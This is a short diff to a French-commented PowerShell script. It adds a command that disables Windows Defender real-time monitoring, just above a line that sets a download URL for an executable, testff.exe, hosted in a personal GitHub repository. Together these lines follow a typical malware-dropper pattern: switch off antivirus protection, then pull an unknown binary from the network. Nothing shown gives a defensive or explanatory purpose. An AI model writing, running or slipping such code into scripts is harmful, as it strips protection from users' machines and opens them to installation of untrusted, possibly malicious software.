@@ -1,3 +1,6 @@
+# Désactiver Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring \$true
+
 # Définir l'URL du fichier à télécharger
 $url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"
 
